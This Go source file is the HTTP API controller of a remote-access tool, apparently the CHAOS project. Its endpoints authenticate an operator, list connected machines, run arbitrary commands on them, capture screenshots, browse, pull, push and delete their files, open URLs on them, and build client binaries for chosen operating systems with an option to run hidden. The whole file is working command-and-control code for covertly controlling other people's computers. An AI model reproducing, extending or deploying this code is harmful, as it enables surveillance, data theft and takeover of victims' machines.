package http

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/tiagorlampert/CHAOS/entities"
	"github.com/tiagorlampert/CHAOS/internal"
	"github.com/tiagorlampert/CHAOS/internal/utils"
	jwtUtil "github.com/tiagorlampert/CHAOS/internal/utils/jwt"
	"github.com/tiagorlampert/CHAOS/internal/utils/system"
	"github.com/tiagorlampert/CHAOS/internal/utils/validation"
	"github.com/tiagorlampert/CHAOS/presentation/http/request"
	"github.com/tiagorlampert/CHAOS/repositories"
	"github.com/tiagorlampert/CHAOS/services/client"
)

const apiCommandTimeout = 30 * time.Second

type apiDevice struct {
	entities.Device
	ClientID string `json:"client_id"`
	Address  string `json:"address"`
}

type apiTarget struct {
	ID    int      `json:"id"`
	Name  string   `json:"name"`
	GOOS  string   `json:"goos"`
	Archs []string `json:"archs"`
}

func newAPIDevice(device entities.Device) apiDevice {
	return apiDevice{
		Device:   device,
		ClientID: device.MacAddress,
		Address:  utils.EncodeBase64(device.MacAddress),
	}
}

func (h *httpController) apiHealthHandler(c *gin.Context) {
	c.JSON(http.StatusOK, gin.H{"status": "ok"})
}

func (h *httpController) apiLoginHandler(c *gin.Context) {
	var body request.LoginAPIRequest
	if err := c.ShouldBindJSON(&body); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	if !h.UserService.Login(body.Username, body.Password) {
		c.JSON(http.StatusUnauthorized, gin.H{"error": "invalid username or password"})
		return
	}

	secret, err := h.AuthService.GetSecret()
	if err != nil {
		h.Logger.Error(err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	token, err := jwtUtil.NewToken(secret, body.Username)
	if err != nil {
		h.Logger.Error(err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"token":  token,
		"expire": time.Now().AddDate(1, 0, 0).UTC(),
	})
}

func (h *httpController) apiGetDevicesHandler(c *gin.Context) {
	devices, err := h.DeviceService.FindAllConnected()
	if err != nil {
		h.Logger.Error(err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	result := make([]apiDevice, 0, len(devices))
	for _, device := range devices {
		result = append(result, newAPIDevice(device))
	}
	c.JSON(http.StatusOK, gin.H{"devices": result})
}

func (h *httpController) apiGetDeviceHandler(c *gin.Context) {
	device, err := h.DeviceService.FindByMacAddress(clientIDFromParam(c))
	if err != nil {
		if errors.Is(err, repositories.ErrNotFound) {
			c.JSON(http.StatusNotFound, gin.H{"error": "device not found"})
			return
		}
		h.Logger.Error(err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, newAPIDevice(*device))
}

func (h *httpController) apiSendCommandHandler(c *gin.Context) {
	var body request.SendCommandAPIRequest
	if err := c.ShouldBindJSON(&body); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	output, ok := h.sendAPICommand(c, clientIDFromParam(c), body.Command, body.Parameter)
	if !ok {
		return
	}
	c.JSON(http.StatusOK, gin.H{"response": output.Response})
}

func (h *httpController) apiScreenshotHandler(c *gin.Context) {
	output, ok := h.sendAPICommand(c, clientIDFromParam(c), "screenshot", "")
	if !ok {
		return
	}

	filename, err := apiTempFilepath(output.Response)
	if err != nil {
		h.Logger.Error(err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.FileAttachment(filename, "screenshot.png")
}

func (h *httpController) apiExplorerHandler(c *gin.Context) {
	output, ok := h.sendAPICommand(c, clientIDFromParam(c), "explore", c.Query("path"))
	if !ok {
		return
	}

	var explorer entities.FileExplorer
	if err := json.Unmarshal(utils.StringToByte(output.Response), &explorer); err != nil {
		c.JSON(http.StatusBadGateway, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, explorer)
}

func (h *httpController) apiOpenUrlHandler(c *gin.Context) {
	var body request.OpenUrlAPIRequest
	if err := c.ShouldBindJSON(&body); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	ctx, cancel := context.WithTimeout(c.Request.Context(), apiCommandTimeout)
	defer cancel()

	if err := h.UrlService.OpenUrl(ctx, clientIDFromParam(c), body.URL); err != nil {
		c.JSON(http.StatusBadGateway, gin.H{"error": err.Error()})
		return
	}
	c.Status(http.StatusNoContent)
}

func (h *httpController) apiDownloadFileHandler(c *gin.Context) {
	remotePath := strings.TrimSpace(c.Query("path"))
	if len(remotePath) == 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "the 'path' query parameter is required"})
		return
	}

	output, ok := h.sendAPICommand(c, clientIDFromParam(c), "download", remotePath)
	if !ok {
		return
	}

	filepath, err := apiTempFilepath(output.Response)
	if err != nil {
		h.Logger.Error(err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	c.FileAttachment(filepath, apiBasename(remotePath))
}

func (h *httpController) apiUploadFileHandler(c *gin.Context) {
	file, err := c.FormFile("file")
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	remotePath := strings.TrimSpace(c.PostForm("path"))
	if len(remotePath) == 0 {
		remotePath = file.Filename
	}

	// Store the file under the remote basename because the agent fetches it by that name.
	filename := apiBasename(remotePath)
	destination := filepath.Join(internal.TempDirectory, filename)
	if err := c.SaveUploadedFile(file, destination); err != nil {
		h.Logger.Error(err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	if _, ok := h.sendAPICommand(c, clientIDFromParam(c), "upload", remotePath); !ok {
		return
	}
	c.JSON(http.StatusOK, gin.H{"filename": filename, "path": remotePath})
}

func (h *httpController) apiDeleteFileHandler(c *gin.Context) {
	remotePath := strings.TrimSpace(c.Query("path"))
	if len(remotePath) == 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "the 'path' query parameter is required"})
		return
	}

	if _, ok := h.sendAPICommand(c, clientIDFromParam(c), "delete", remotePath); !ok {
		return
	}
	c.Status(http.StatusNoContent)
}

func (h *httpController) apiListTargetsHandler(c *gin.Context) {
	ids := make([]int, 0, len(system.OSTargetIntMap))
	for id := range system.OSTargetIntMap {
		ids = append(ids, id)
	}
	sort.Ints(ids)

	targets := make([]apiTarget, 0, len(ids))
	for _, id := range ids {
		target := system.OSTargetIntMap[id]
		targets = append(targets, apiTarget{
			ID:    id,
			Name:  system.OSTargetMap[target],
			GOOS:  system.OSTargetGoOSMap[target],
			Archs: system.OSTargetArchMap[target],
		})
	}
	c.JSON(http.StatusOK, gin.H{"targets": targets})
}

func (h *httpController) apiBuildClientHandler(c *gin.Context) {
	var body request.BuildClientAPIRequest
	if err := c.ShouldBindJSON(&body); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}

	target, found := system.ParseOSTarget(body.OSTarget)
	if !found {
		c.JSON(http.StatusBadRequest, gin.H{"error": internal.ErrInvalidOSTarget.Error()})
		return
	}

	serverAddress, serverPort := h.apiServerAddress(c, body.ServerAddress, body.ServerPort)

	filename, err := h.ClientService.BuildClient(client.BuildClientBinaryInput{
		ServerAddress: serverAddress,
		ServerPort:    serverPort,
		OSTarget:      target,
		OSArch:        body.OSArch,
		Filename:      body.Filename,
		RunHidden:     body.RunHidden,
	})
	if err != nil {
		if errors.Is(err, internal.ErrInvalidServerAddress) ||
			errors.Is(err, internal.ErrInvalidServerPort) ||
			errors.Is(err, internal.ErrInvalidOSTarget) ||
			errors.Is(err, internal.ErrInvalidOSArch) {
			c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
			return
		}
		h.Logger.Error(err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"filename":     filename,
		"download_url": "/api/v1/clients/" + url.PathEscape(filename),
	})
}

func (h *httpController) apiDownloadClientHandler(c *gin.Context) {
	path, err := apiTempFilepath(c.Param("filename"))
	if err != nil {
		if errors.Is(err, os.ErrNotExist) {
			c.JSON(http.StatusNotFound, gin.H{"error": "file not found"})
			return
		}
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	c.FileAttachment(path, filepath.Base(path))
}

func (h *httpController) sendAPICommand(c *gin.Context, clientID, command, parameter string) (client.SendCommandOutput, bool) {
	ctx, cancel := context.WithTimeout(c.Request.Context(), apiCommandTimeout)
	defer cancel()

	output, err := h.ClientService.SendCommand(ctx, client.SendCommandInput{
		ClientID:  clientID,
		Command:   command,
		Parameter: parameter,
	})
	if err != nil {
		c.JSON(http.StatusBadGateway, gin.H{"error": err.Error()})
		return output, false
	}
	if output.Response == internal.ErrClientConnectionNotFound.Error() {
		c.JSON(http.StatusNotFound, gin.H{"error": output.Response})
		return output, false
	}
	return output, true
}

// clientIDFromParam accepts either a raw MAC address or its base64 representation.
func clientIDFromParam(c *gin.Context) string {
	id := c.Param("id")
	if decoded, err := utils.DecodeBase64(id); err == nil && validation.IsValidMacAddress(decoded) {
		return decoded
	}
	return id
}

func (h *httpController) apiServerAddress(c *gin.Context, address, port string) (string, string) {
	address = strings.TrimSpace(address)
	address = strings.TrimPrefix(address, "https://")
	address = strings.TrimPrefix(address, "http://")
	address = strings.TrimSuffix(address, "/")
	port = strings.TrimSpace(port)

	if host, hostPort, err := net.SplitHostPort(address); err == nil {
		address = host
		if len(port) == 0 {
			port = hostPort
		}
	}

	if len(address) == 0 {
		host, hostPort, err := net.SplitHostPort(c.Request.Host)
		if err != nil {
			address = c.Request.Host
		} else {
			address = host
			if len(port) == 0 {
				port = hostPort
			}
		}
	}
	if len(port) == 0 {
		port = strings.TrimPrefix(h.Configuration.Server.Port, ":")
	}
	return address, port
}

func apiBasename(path string) string {
	return filepath.Base(strings.ReplaceAll(path, "\\", "/"))
}

func apiTempFilepath(filename string) (string, error) {
	name := apiBasename(filename)
	if len(name) == 0 || name == "." {
		return "", fmt.Errorf("invalid filename")
	}
	path := filepath.Join(internal.TempDirectory, name)

	fileInfo, err := os.Stat(path)
	if err != nil {
		return "", err
	}
	if fileInfo.IsDir() {
		return "", fmt.Errorf("'%s' is a directory", name)
	}
	return path, nil
}
